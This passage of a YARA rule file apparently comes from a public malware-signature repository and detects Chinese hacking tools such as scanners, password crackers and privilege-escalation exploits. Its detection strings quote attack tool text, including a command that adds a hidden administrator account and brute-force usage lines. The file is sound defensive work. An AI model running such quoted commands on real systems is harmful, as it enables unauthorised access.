0x5a4d and filesize < 100KB and all of them\n}\n\nrule ChineseHacktools_arpsniffer\n{\n    meta:\n        description = \"Chinese hacktool (file: arpsniffer.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"arpsniffer\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"SHELL\" ascii\n        $s2 = \"PacketSendPacket\" fullword ascii\n        $s3 = \"ArpSniff\" ascii\n        $s4 = \"pcap_loop\" fullword ascii\n        $s5 = \"packet.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 120KB and all of them\n}\n\nrule ChineseHacktools_pw_inspector_2\n{\n    meta:\n        description = \"Chinese hacktool (file: pw-inspector.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"pw_inspector_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n        $s2 = \"Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p \" ascii\n        $s3 = \"PW-Inspector\" fullword ascii\n        $s4 = \"i:o:m:M:c:lunps\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule ChineseHacktools_datPcShare\n{\n    meta:\n        description = \"Chinese hacktool (file: datPcShare.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"datPcShare\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"PcShare.EXE\" fullword wide\n        $s2 = \"MZKERNEL32.DLL\" fullword ascii\n        $s3 = \"PcShare\" fullword wide\n        $s4 = \"QQ:4564405\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule ChineseHacktools_Tools_xport\n{\n    meta:\n        description = \"Chinese hacktool (file: xport.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Tools_xport\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)\" fullword ascii\n        $s2 = \"Example: xport www.xxx.com 80 -m syn\" fullword ascii\n        $s3 = \"%s - command line port scanner\" fullword ascii\n        $s4 = \"xport 192.168.1.1 1-1024 -t 200 -v\" fullword ascii\n        $s5 = \"Usage: xport <Host> <Ports Scope> [Options]\" fullword ascii\n        $s6 = \".\\\\port.ini\" fullword ascii\n        $s7 = \"Port scan complete, total %d port, %d port is opened, use %d ms.\" fullword ascii\n        $s8 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n        $s9 = \"http://www.xfocus.org\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule ChineseHacktools_Pc_xai\n{\n    meta:\n        description = \"Chinese hacktool (file: xai.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Pc_xai\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/\" fullword wide\n        $s2 = \"%SystemRoot%\\\\System32\\\\\" fullword ascii\n        $s3 = \"%APPDATA%\\\\\" fullword ascii\n        $s4 = \"---- C.Rufus Security Team ----\" fullword wide\n        $s5 = \"www.snzzkz.com\" fullword wide\n        $s6 = \"%CommonProgramFiles%\\\\\" fullword ascii\n        $s7 = \"GetRand.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule ChineseHacktools_Radmin_Hash\n{\n    meta:\n        description = \"Chinese hacktool (file: Radmin_Hash.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Radmin_Hash\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"<description>IEBars</description>\" fullword ascii\n        $s2 = \"PECompact2\" fullword ascii\n        $s3 = \"Radmin, Remote Administrator\" fullword wide\n        $s4 = \"Radmin 3.0 Hash \" fullword wide\n        $s5 = \"HASH1.0\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule ChineseHacktools_OSEditor\n{\n    meta:\n        description = \"Chinese hacktool (file: OSEditor.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OSEditor\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"OSEditor.exe\" fullword wide\n        $s2 = \"netsafe\" wide\n        $s3 = \"OSC Editor\" fullword wide\n        $s4 = \"GIF89\" ascii\n        $s5 = \"Unlock\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule ChineseHacktools_GoodToolset_ms11011\n{\n    meta:\n        description = \"Chinese hacktool (file: ms11011.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoodToolset_ms11011\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n        $s1 = \"OS not supported.\" fullword ascii\n        $s3 = \"Not supported.\" fullword wide\n        $s4 = \"SystemDefaultEUDCFont\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule ChineseHacktools_FreeVersion_release\n{\n    meta:\n        description = \"Chinese hacktool (file: release.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FreeVersion_release\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"-->Got WMI process Pid: %d \" ascii\n        $s2 = \"This exploit will execute \\\"net user \" ascii\n        $s3 = \"net user temp 123456 /add & net localgroup administrators temp /add\" fullword ascii\n        $s4 = \"Running reverse shell\" ascii\n        $s5 = \"wmiprvse.exe\" fullword ascii\n        $s6 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule ChineseHacktools_churrasco\n{\n    meta:\n        description = \"Chinese hacktool (file: churrasco.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"churrasco\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Done, command should have ran as SYSTEM!\" ascii\n        $s2 = \"Running command with SYSTEM Token...\" ascii\n        $s3 = \"Thread impersonating, got NETWORK SERVICE Token: 0x%x\" ascii\n        $s4 = \"Found SYSTEM token 0x%x\" ascii\n        $s5 = \"Thread not impersonating, looking for another thread...\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule ChineseHacktools_x64_KiwiCmd\n{\n    meta:\n        description = \"Chinese hacktool (file: KiwiCmd.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"x64_KiwiCmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n        $s2 = \"Kiwi Cmd no-gpo\" fullword wide\n        $s3 = \"KiwiAndCMD\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and 2 of them\n}\n\nrule ChineseHacktools_sql1433_SQL\n{\n    meta:\n        description = \"Chinese hacktool (file: SQL.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"sql1433_SQL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 }\n        $s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 90KB and all of them\n}\n\nrule ChineseHacktools_CookieTools2\n{\n    meta:\n        description = \"Chinese hacktool (file: CookieTools2.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CookieTools2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"www.gxgl.com&www.gxgl.net\" fullword wide\n        $s2 = \"ip.asp?IP=\" fullword ascii\n        $s3 = \"MSIE 5.5;\" fullword ascii\n        $s4 = \"SOFTWARE\\\\Borland\\\\\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and all of them\n}\n\nrule ChineseHacktools_cyclotron\n{\n    meta:\n        description = \"Chinese hacktool (file: cyclotron.sys)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"cyclotron\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Device\\\\IDTProt\" fullword wide\n        $s2 = \"IoDeleteSymbolicLink\" fullword ascii\n        $s3 = \"\\\\??\\\\slIDTProt\" fullword wide\n        $s4 = \"IoDeleteDevice\" fullword ascii\n        $s5 = \"IoCreateSymbolicLink\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3KB and all of them\n}\n\nrule ChineseHacktools_xscan_gui\n{\n    meta:\n        description = \"Chinese hacktool (file: xscan_gui.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"xscan_gui\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s -mutex %s -host %s -index %d -config \\\"%s\\\"\" fullword ascii\n        $s2 = \"www.target.com\" fullword ascii\n        $s3 = \"%s\\\\scripts\\\\desc\\\\%s.desc\" fullword ascii\n        $s4 = \"%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule ChineseHacktools_hscan\n{\n    meta:\n        description = \"Chinese hacktool (file: hscan.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_hscan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000\" fullword ascii\n        $s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20\" fullword ascii\n        $s3 = \"%s -h www.target.com -all\" fullword ascii\n        $s4 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n        $s5 = \".\\\\log\\\\Hscan.log\" fullword ascii\n        $s6 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n        $s7 = \"%s@ftpscan#FTP Account:  %s/[null]\" fullword ascii\n        $s8 = \".\\\\conf\\\\mysql_pass.dic\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule ChineseHacktools_GoodToolset_pr\n{\n    meta:\n        description = \"Chinese hacktool (file: pr.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoodToolset_pr\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"-->Got WMI process Pid: %d \" ascii\n        $s2 = \"-->This exploit gives you a Local System shell \" ascii\n        $s3 = \"wmiprvse.exe\" fullword ascii\n        $s4 = \"Try the first %d time\" fullword ascii\n        $s5 = \"-->Build&&Change By p \" ascii\n        $s6 = \"root\\\\MicrosoftIISv2\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_hydra_7_4_1_hydra\n{\n    meta:\n        description = \"Chinese hacktool (file: hydra.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hydra_7_4_1_hydra\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%d of %d target%s%scompleted, %lu valid password%s found\" fullword ascii\n        $s2 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n        $s3 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n        $s4 = \"[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED\" fullword ascii\n        $s5 = \"[ERROR] SMTP LOGIN AUTH, either this auth is disabled\" fullword ascii\n        $s6 = \"\\\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\\\"\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule ChineseHacktools_Dos_NtGod\n{\n    meta:\n        description = \"Chinese hacktool (file: NtGod.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_NtGod\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\temp\\\\NtGodMode.exe\" ascii\n        $s4 = \"NtGodMode.exe\" fullword ascii\n        $s10 = \"ntgod.bat\" fullword ascii\n        $s19 = \"sfxcmd\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule ChineseHacktools_VNCLink\n{\n    meta:\n        description = \"Chinese hacktool (file: VNCLink.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_VNCLink\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\temp\\\\vncviewer4.log\" fullword ascii\n        $s2 = \"[BL4CK] Patched by redsand || http://blacksecurity.org\" fullword ascii\n        $s3 = \"fake release extendedVkey 0x%x, keysym 0x%x\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 580KB and 2 of them\n}\n\nrule ChineseHacktools_tools_NTCmd\n{\n    meta:\n        description = \"Chinese hacktool (file: NTCmd.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"tools_NTCmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"pipecmd \\\\\\\\%s -U:%s -P:\\\"\\\" %s\" fullword ascii\n        $s2 = \"[Usage]:  %s <HostName|IP> <Username> <Password>\" fullword ascii\n        $s3 = \"pipecmd \\\\\\\\%s -U:%s -P:%s %s\" fullword ascii\n        $s4 = \"============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============\" fullword ascii\n        $s5 = \"=======================NTcmd v0.11 for HScan v1.20=======================\" fullword ascii\n        $s6 = \"NTcmd>\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 80KB and 2 of them\n}\n\nrule ChineseHacktools_mysql_pwd_crack\n{\n    meta:\n        description = \"Chinese hacktool (file: mysql_pwd_crack.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"mysql_pwd_crack\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"mysql_pwd_crack 127.0.0.1 -x 3306 -p root -d userdict.txt\" fullword ascii\n        $s2 = \"Successfully --> username %s password %s \" fullword ascii\n        $s3 = \"zhouzhen@gmail.com http://zhouzhen.eviloctal.org\" fullword ascii\n        $s4 = \"-a automode  automatic crack the mysql password \" fullword ascii\n        $s5 = \"mysql_pwd_crack 127.0.0.1 -x 3306 -a\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 1 of them\n}\n\nrule ChineseHacktools_CmdShell64\n{\n    meta:\n        description = \"Chinese hacktool (file: CmdShell64.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CmdShell64\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\Windows\\\\System32\\\\JAVASYS.EXE\" fullword wide\n        $s2 = \"ServiceCmdShell\" fullword ascii\n        $s3 = \"<!-- If your application is designed to work with Windows 8.1, uncomment the fol\" ascii\n        $s4 = \"ServiceSystemShell\" fullword wide\n        $s5 = \"[Root@CmdShell ~]#\" fullword wide\n        $s6 = \"Hello Man 2015 !\" fullword wide\n        $s7 = \"CmdShell\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and 4 of them\n}\n\nrule ChineseHacktools_Ms_Viru_v\n{\n    meta:\n        description = \"Chinese hacktool (file: v.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Ms_Viru_v\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n        $s2 = \"Easy Usage Version -- Edited By: racle@tian6.com\" fullword ascii\n        $s3 = \"OH,Sry.Too long command.\" fullword ascii\n        $s4 = \"Success! Commander.\" fullword ascii\n        $s5 = \"Hey,how can racle work without ur command ?\" fullword ascii\n        $s6 = \"The exploit thread was unable to map the virtual 8086 address space\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 3 of them\n}\n\nrule ChineseHacktools_Vscan\n{\n    meta:\n        description = \"Chinese hacktool (file: Vscan.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Tools_Vscan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[+] Usage: VNC_bypauth <target> <scantype> <option>\" fullword ascii\n        $s2 = \"========RealVNC <= 4.1.1 Bypass Authentication Scanner=======\" fullword ascii\n        $s3 = \"[+] Type VNC_bypauth <target>,<scantype> or <option> for more informations\" fullword ascii\n        $s4 = \"VNC_bypauth -i 192.168.0.1,192.168.0.2,192.168.0.3,...\" fullword ascii\n        $s5 = \"-vn:%-15s:%-7d  connection closed\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and 2 of them\n}\n\nrule ChineseHacktools_Dos_iis\n{\n    meta:\n        description = \"Chinese hacktool (file: iis.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Dos_iis\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"comspec\" fullword ascii\n        $s2 = \"program terming\" fullword ascii\n        $s3 = \"WinSta0\\\\Defau\" fullword ascii\n        $s4 = \"* FROM IIsWebInfo\" ascii\n        $s5 = \"www.icehack.\" ascii\n        $s6 = \"wmiprvse.exe\" fullword ascii\n        $s7 = \"Pid: %d\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 70KB and all of them\n}\n\nrule ChineseHacktools_IISPutScannesr\n{\n    meta:\n        description = \"Chinese hacktool (file: IISPutScannesr.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"IISPutScannesr\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"yoda & M.o.D.\" ascii\n        $s2 = \"-> come.to/f2f **************\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule ChineseHacktools_Generate\n{\n    meta:\n        description = \"Chinese hacktool (file: Generate.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Generate\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"C:\\\\TEMP\\\\\" fullword ascii\n        $s2 = \"Connection Closed Gracefully.;Could not bind socket. Address and port are alread\" wide\n        $s3 = \"$530 Please login with USER and PASS.\" fullword ascii\n        $s4 = \"_Shell.exe\" fullword ascii\n        $s5 = \"ftpcWaitingPassword\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and 3 of them\n}\n\nrule ChineseHacktools_Pc_rejoice\n{\n    meta:\n        description = \"Chinese hacktool (file: rejoice.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Pc_rejoice\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"@members.3322.net/dyndns/update?system=dyndns&hostname=\" fullword ascii\n        $s2 = \"http://www.xxx.com/xxx.exe\" fullword ascii\n        $s3 = \"@ddns.oray.com/ph/update?hostname=\" fullword ascii\n        $s4 = \"No data to read.$Can not bind in port range (%d - %d)\" fullword wide\n        $s5 = \"ListViewProcessListColumnClick!\" fullword ascii\n        $s6 = \"http://iframe.ip138.com/ic.asp\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and 3 of them\n}\n\nrule ChineseHacktools_ms11080_withcmd\n{\n    meta:\n        description = \"Chinese hacktool (file: ms11080_withcmd.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ms11080_withcmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage : ms11-080.exe cmd.exe Command \" fullword ascii\n        $s2 = \"\\\\ms11080\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n        $s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n        $s4 = \"[>] create porcess error\" fullword ascii\n        $s5 = \"[>] ms11-080 Exploit\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and 1 of 